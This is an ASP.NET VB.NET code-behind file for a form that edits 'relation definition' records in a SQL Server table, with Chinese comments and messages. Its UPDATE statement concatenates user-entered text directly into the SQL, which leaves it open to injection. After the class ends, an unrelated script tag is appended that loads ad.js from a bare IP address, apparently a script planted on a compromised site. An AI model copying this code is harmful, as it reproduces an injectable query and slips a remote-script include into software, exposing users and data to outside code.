Imports System.Data
Imports System.Data.SqlClient

Public Class rdefinitionmodification
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents lblDefSearch As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstDefSearch As System.Web.UI.WebControls.DropDownList
    Protected WithEvents ddlstDefAtt As System.Web.UI.WebControls.DropDownList
    Protected WithEvents btnDefSearch As System.Web.UI.WebControls.Button
    Protected WithEvents lblDefKey As System.Web.UI.WebControls.Label
    Protected WithEvents lblIsDir As System.Web.UI.WebControls.Label
    Protected WithEvents txtDefKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents rbtnIsDirYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsDirNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents lblDefName As System.Web.UI.WebControls.Label
    Protected WithEvents lblAccPri As System.Web.UI.WebControls.Label
    Protected WithEvents txtDefName As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblIsConf As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnIsConfYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsConfNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents lblDefNum As System.Web.UI.WebControls.Label
    Protected WithEvents txtDefNum As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblIsValid As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnIsValidYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsValidNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents btnNext As System.Web.UI.WebControls.Button
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents rbtnAccPri1 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri2 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri3 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label
    Protected WithEvents txtDefKeyRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator
    Protected WithEvents txtRelObjNumRegularexpressionvalidator1 As System.Web.UI.WebControls.RegularExpressionValidator

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub Initial(ByVal index As Integer)  ' 初始化页面显示
        Me.txtDefKey.Text = Session("myDateSet").Tables("rdefinition").Rows(index).Item("rdefinitionkey")
        Me.txtDefName.Text = Session("myDateSet").Tables("rdefinition").Rows(index).Item("rdefinitionname")
        Me.txtDefNum.Text = Session("myDateSet").Tables("rdefinition").Rows(index).Item("relatedobjnum")
        Dim temp = Session("myDateSet").Tables("rdefinition").Rows(index).Item("accessprivilege")
        If temp = "1" Then
            Me.rbtnAccPri2.Checked = False
            Me.rbtnAccPri3.Checked = False
            Me.rbtnAccPri1.Checked = True
        ElseIf temp = "2" Then
            Me.rbtnAccPri1.Checked = False
            Me.rbtnAccPri3.Checked = False
            Me.rbtnAccPri2.Checked = True
        Else
            Me.rbtnAccPri1.Checked = False
            Me.rbtnAccPri2.Checked = False
            Me.rbtnAccPri3.Checked = True
        End If

        If Session("myDateSet").Tables("rdefinition").Rows(index).Item("isvalid") = "1" Then
            Me.rbtnIsValidNo.Checked = False
            Me.rbtnIsValidYes.Checked = True
        Else
            Me.rbtnIsValidYes.Checked = False
            Me.rbtnIsValidNo.Checked = True
        End If

        If Session("myDateSet").Tables("rdefinition").Rows(index).Item("isdirectional") = "1" Then
            Me.rbtnIsDirNo.Checked = False
            Me.rbtnIsDirYes.Checked = True
        Else
            Me.rbtnIsDirYes.Checked = False
            Me.rbtnIsDirNo.Checked = True
        End If

        If Session("myDateSet").Tables("rdefinition").Rows(index).Item("needaffirm") = "1" Then
            Me.rbtnIsConfNo.Checked = False
            Me.rbtnIsConfYes.Checked = True
        Else
            Me.rbtnIsConfYes.Checked = False
            Me.rbtnIsConfNo.Checked = True
        End If
    End Sub

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码
        Me.lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()
        Me.txtDefKey.Enabled = False

        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If

        If Not IsPostBack Then  ' 用户x第一次打开页面时
            Dim strSql As String
            Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
            Try
                mySqlConn.Open()

                Dim mySqlAdapter As New SqlDataAdapter("select * from rdefinition", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "rdefinition")
                Me.ddlstDefSearch.DataSource = myDateSet.Tables("rdefinition").DefaultView
                Me.ddlstDefSearch.DataValueField = "rdefinitionkey"
                Me.ddlstDefSearch.DataBind()
                Me.Session("myDateSet") = myDateSet
                Initial(0)
                Me.Session("index") = 0
                Me.Session("colname") = "rdefinitionkey"
                mySqlConn.Close()
            Catch ex As SqlException
                Throw ex
                'Response.Redirect("error.htm") ' 错误提示
            Finally
            End Try
        End If
    End Sub

    Private Sub btnDefSearch_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnDefSearch.Click
        Me.ddlstDefSearch.DataSource = Session("myDateSet").Tables("rdefinition").DefaultView
        Me.ddlstDefSearch.DataValueField = Me.Session("colname")
        Me.ddlstDefSearch.DataBind()
        Me.ddlstDefSearch.SelectedIndex = Me.Session("index")
        Initial(Me.Session("index"))
    End Sub

    Private Sub ddlstDefAtt_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ddlstDefAtt.SelectedIndexChanged
        If Me.ddlstDefAtt.SelectedIndex = 0 Then
            Me.Session("colname") = "rdefinitionkey"
        Else
            Me.Session("colname") = "rdefinitionname"
        End If
    End Sub

    Private Sub ddlstDefSearch_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ddlstDefSearch.SelectedIndexChanged
        Me.Session("index") = Me.ddlstDefSearch.SelectedIndex
    End Sub

    Private Sub btnNext_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNext.Click
        If (Me.txtDefKey.Text.Trim() = "" Or Me.txtDefName.Text.Trim() = "" Or _
            Me.txtDefNum.Text.Trim() = "") Then
            Me.lblWarning.Text = "提醒：请先填好全部信息"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim mySqlComm As SqlCommand

        Try
            ' 获取用户权限值，有效性值,是否需要关联对象的确认信息,是否有向
            ' 保存在chrAccPri, chrIsValid，chrNeedAff和chrIsDir中
            Dim chrAccPri As Char
            Dim chrIsValid As Char
            Dim chrNeedAff As Char
            Dim chrIsDir As Char
            If Me.rbtnAccPri1.Checked = True Then
                chrAccPri = "1"
            ElseIf Me.rbtnAccPri2.Checked = True Then
                chrAccPri = "2"
            Else
                chrAccPri = "3"
            End If
            If Me.rbtnIsValidYes.Checked = True Then
                chrIsValid = "1"
            Else
                chrIsValid = "0"
            End If
            If Me.rbtnIsConfYes.Checked = True Then
                chrNeedAff = "1"
            Else
                chrNeedAff = "0"
            End If
            If Me.rbtnIsDirYes.Checked = True Then
                chrIsDir = "1"
            Else
                chrIsDir = "0"
            End If

            ' 修改数据项
            strSql = "update rdefinition set rdefinitionname='" + Me.txtDefName.Text.Trim() + _
                "',relatedobjnum='" + Me.txtDefNum.Text.Trim() + _
                "',isvalid='" + chrIsValid + "',accessprivilege='" + chrAccPri + _
                "',needaffirm='" + chrNeedAff + "',isdirectional='" + chrIsDir + _
                "',latestupdatetime='" + Now.ToString("yyyy-MM-dd HH:mm:ss") + _
                "' where rdefinitionkey='" + Me.txtDefKey.Text.Trim() + "'"
            mySqlComm = New SqlCommand(strSql, mySqlConn)

            mySqlConn.Open()
            If (mySqlComm.ExecuteNonQuery() > 0) Then
                Me.lblWarning.Text = "恭喜：修改关系类型成功" + Me.txtDefKey.Text.Trim() + "成功"
                Me.lblWarning.Visible = True
                Dim mySqlAdapter As New SqlDataAdapter("select * from rdefinition", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "rdefinition")
                Me.Session("myDateSet") = myDateSet
                Me.Response.Redirect("modificationassertion.aspx")

















            Else
                Me.lblWarning.Text = "警告：由于某种原因修改关系类型失败，可能你没有权限"
                Me.lblWarning.Visible = True
            End If
            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        Me.lblWarning.Visible = False
        Me.ddlstDefSearch.SelectedIndex = Me.Session("index")
        Initial(Me.Session("index"))
    End Sub

    Private Sub rbtnIsValidYes_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles rbtnIsValidYes.CheckedChanged

    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
